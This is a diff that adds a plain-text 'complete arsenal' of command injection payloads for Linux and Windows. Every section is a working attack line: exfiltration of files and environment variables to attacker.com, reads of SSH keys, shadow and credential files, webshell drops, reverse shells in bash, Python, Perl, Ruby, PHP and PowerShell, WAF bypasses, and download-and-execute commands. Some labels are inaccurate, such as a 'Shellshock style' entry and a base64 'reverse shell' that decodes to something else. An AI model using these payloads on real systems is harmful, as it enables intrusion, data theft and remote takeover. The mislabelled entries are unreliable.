@@ -1,0 +1,234 @@
+================================================================================
+COMMAND INJECTION PAYLOADS - COMPLETE ARSENAL
+================================================================================
+
+================================================================================
+BASIC COMMAND INJECTION PAYLOADS (Linux/Unix)
+================================================================================
+
+; id – Semicolon injection
+| id – Pipe injection
+&& id – AND condition injection
+|| id – OR condition injection
+`id` – Backtick command substitution
+$(id) – Dollar-parentheses substitution
+\nid\n – Newline injection
+; whoami – Get current user
+| whoami – Pipe whoami
+; uname -a – System information
+; ls – List directory
+; pwd – Print working directory
+; echo $PATH – Show PATH variable
+; env – Show environment variables
+; cat /etc/passwd – Read password file
+; cat /etc/hostname – Show hostname
+
+================================================================================
+BASIC COMMAND INJECTION PAYLOADS (Windows)
+================================================================================
+
+& whoami – Ampersand injection
+| whoami – Pipe injection
+&& whoami – AND condition injection
+|| whoami – OR condition injection
+% whoami – Percent sign injection
+; whoami – Semicolon (some Windows environments)
+& ver – Show Windows version
+& systeminfo – System information
+& dir C:\ – Directory listing
+& echo %USERNAME% – Show username
+& set – Show environment variables
+& type C:\windows\win.ini – Read Windows file
+& ipconfig – Network configuration
+& whoami /all – User details with privileges
+
+================================================================================
+TIME-BASED BLIND COMMAND INJECTION (Linux/Unix)
+================================================================================
+
+; sleep 5 – Semicolon with sleep
+| sleep 5 – Pipe with sleep
+&& sleep 5 – AND with sleep
+|| sleep 5 – OR with sleep
+$(sleep 5) – Command substitution sleep
+`sleep 5` – Backtick sleep
+; ping -c 5 127.0.0.1 – Ping delay
+; timeout 5 sleep 5 – Timeout command
+; usleep 5000000 – Microsecond sleep
+
+================================================================================
+TIME-BASED BLIND COMMAND INJECTION (Windows)
+================================================================================
+
+& timeout 5 – Timeout command
+| timeout 5 – Pipe timeout
+&& timeout 5 – AND timeout
+|| timeout 5 – OR timeout
+& ping -n 5 127.0.0.1 – Ping delay
+& sleep 5 – PowerShell sleep (if available)
+& powershell Start-Sleep -s 5 – PowerShell sleep
+
+================================================================================
+DNS-BASED BLIND COMMAND INJECTION (OOB Exfiltration)
+================================================================================
+
+; nslookup attacker.com – DNS lookup via nslookup
+; dig attacker.com – DNS lookup via dig
+; host attacker.com – DNS lookup via host
+$(nslookup attacker.com) – Command substitution DNS
+| nslookup attacker.com – Pipe DNS
+; ping -c 1 attacker.com – ICMP exfiltration
+; curl http://attacker.com – HTTP callback
+; wget http://attacker.com – Wget callback
+; nc attacker.com 4444 – Netcat callback
+; bash -c "curl http://attacker.com/$(whoami)" – Data exfiltration via URL
+
+================================================================================
+DNS-BASED BLIND COMMAND INJECTION (Windows)
+================================================================================
+
+& nslookup attacker.com – DNS lookup
+| nslookup attacker.com – Pipe DNS
+& ping -n 1 attacker.com – ICMP exfiltration
+& curl http://attacker.com – HTTP callback (if installed)
+& certutil -urlcache -f http://attacker.com null – Certutil callback
+& powershell Invoke-WebRequest -Uri http://attacker.com – PowerShell callback
+& nslookup attacker.com $(whoami) – Data exfiltration
+
+================================================================================
+OUTPUT REDIRECTION PAYLOADS (Extract Data)
+================================================================================
+
+; id > /tmp/output.txt – Write to temp file
+; cat /tmp/output.txt – Read temp file
+; curl -X POST -d @/tmp/output.txt http://attacker.com – Upload file
+; wget --post-file=/tmp/output.txt http://attacker.com – Wget upload
+; nc attacker.com 4444 < /tmp/output.txt – Netcat send
+; id | curl http://attacker.com -d @- – Pipe to curl
+; tar czf - /etc | curl http://attacker.com -d @- – Tar and upload
+
+================================================================================
+FILE READ PAYLOADS (Linux/Unix)
+================================================================================
+
+; cat /etc/passwd – Read password file
+; head -n 10 /etc/passwd – First 10 lines
+; tail -n 10 /var/log/auth.log – Last 10 log lines
+; cat ~/.ssh/id_rsa – Read SSH private key
+; cat /root/.ssh/id_rsa – Read root SSH key
+; cat /etc/shadow – Read shadow file (requires root)
+; cat /proc/self/environ – Read environment variables
+; cat /proc/version – Kernel version
+; cat /proc/cmdline – Boot parameters
+; cat /etc/hosts – Hosts file
+; cat /etc/hostname – Hostname
+; cat /etc/issue – OS info
+; cat /var/www/html/.env – Read .env file
+; cat /home/*/.bash_history – Read bash history
+; cat /root/.bash_history – Root history
+; cat /etc/apache2/apache2.conf – Apache config
+; cat /etc/nginx/nginx.conf – Nginx config
+
+================================================================================
+FILE READ PAYLOADS (Windows)
+================================================================================
+
+& type C:\windows\win.ini – Read Windows file
+& type C:\windows\system32\drivers\etc\hosts – Hosts file
+& type C:\inetpub\wwwroot\web.config – IIS config
+& type C:\xampp\apache\conf\httpd.conf – Apache config
+& type C:\windows\repair\sam – SAM backup (requires admin)
+& type C:\windows\repair\system – System backup
+& type C:\Users\*\Desktop\*.txt – User desktop files
+& type C:\Users\*\AppData\Roaming\Microsoft\Credentials\* – Credential files
+
+================================================================================
+FILE WRITE/WEBSHELL PAYLOADS
+================================================================================
+
+; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php – PHP webshell
+; echo '<?php eval($_POST["cmd"]); ?>' > /var/www/html/reverse.php – PHP eval shell
+; echo '<% eval request("cmd") %>' > /var/www/html/shell.asp – ASP webshell
+; echo '<?php file_put_contents("shell.php","<?php system($_GET[\"cmd\"]);?>");' – Self-replicating
+; curl http://attacker.com/shell.php -o /var/www/html/shell.php – Download webshell
+; wget http://attacker.com/shell.php -O /var/www/html/shell.php – Wget download
+
+================================================================================
+REVERSE SHELL PAYLOADS (Linux/Unix)
+================================================================================
+
+; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' – Bash reverse shell
+; nc -e /bin/sh 10.0.0.1 4444 – Netcat reverse shell
+; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])' – Python reverse shell
+; perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' – Perl reverse shell
+; ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4444");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);$stdin.each_line{|l|l=l.strip;next if l.empty?;(l=~/\Acd (.+)/?Dir.chdir($1):(IO.popen(l,"r"){|io|c.print io.read}rescue c.print "error: #{$!}\n")}}' – Ruby reverse shell
+; php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");' – PHP reverse shell
+; socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444 – Socat reverse shell
+
+================================================================================
+REVERSE SHELL PAYLOADS (Windows)
+================================================================================
+
+& powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" – PowerShell reverse shell
+& certutil -urlcache -f http://attacker.com/nc.exe nc.exe – Download netcat
+& nc.exe 10.0.0.1 4444 -e cmd.exe – Netcat reverse shell
+
+================================================================================
+WAF BYPASS COMMAND INJECTION PAYLOADS
+================================================================================
+
+;${IFS}id – IFS variable space bypass
+;{id,} – Brace expansion
+;`{id,}` – Brace with backticks
+;$(printf\x20id) – Printf space bypass
+;%0a id – Line feed encoded
+;%0d%0a id – CRLF encoded
+;%3B id – URL encoded semicolon
+;%26%26 id – URL encoded AND
+; a=i;d; $a$d – Variable splitting
+; /???/??d – Wildcard path (/bin/id)
+; /*/id – Wildcard any directory
+; /???/??? /???/passwd – Wildcard cat passwd
+
+================================================================================
+PAYLOAD CHAINING (Multi-Command)
+================================================================================
+
+; id | grep root – Pipe output to grep
+; cat /etc/passwd | grep root – Read and filter
+; whoami | curl http://attacker.com -d @- – Pipe to curl
+; id >> /tmp/log.txt; cat /tmp/log.txt – Append and read
+; cd /etc; cat passwd – Change directory then read
+; ls -la /; cat /etc/passwd – List then read
+
+================================================================================
+ENVIRONMENT VARIABLE EXFILTRATION
+================================================================================
+
+; env | curl http://attacker.com -d @- – Send all env vars
+; env > /tmp/env.txt; curl -F file=@/tmp/env.txt http://attacker.com – Upload env file
+; echo $PATH $USER $HOME $SHELL – Echo multiple variables
+
+================================================================================
+PRIVILEGE ESCALATION COMMANDS
+================================================================================
+
+; sudo -l – List sudo privileges
+; sudo id – Execute as root (if passwordless)
+; find / -perm -4000 2>/dev/null – Find SUID binaries
+; cat /etc/sudoers – Read sudoers file
+; id; groups – Show user and group info
+; whoami; id – User info
+
+================================================================================
+REAL-WORLD COMMAND INJECTION NOTABLE PAYLOADS
+================================================================================
+
+; ping -c 1 127.0.0.1; wget http://evil.com/shell.sh – Shellshock style (2014)
+; {echo,MTMzNzo6Ojphc2RmOjAwMDA6Ojphc2RmCg==}|{base64,-d}|{bash,-i} – Base64 encoded reverse shell
+; printf '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | /bin/sh – Write and execute
+; curl -s http://evil.com/payload.txt | sh – Download and execute
+
+================================================================================
+END OF COMMAND INJECTION PAYLOADS
+================================================================================
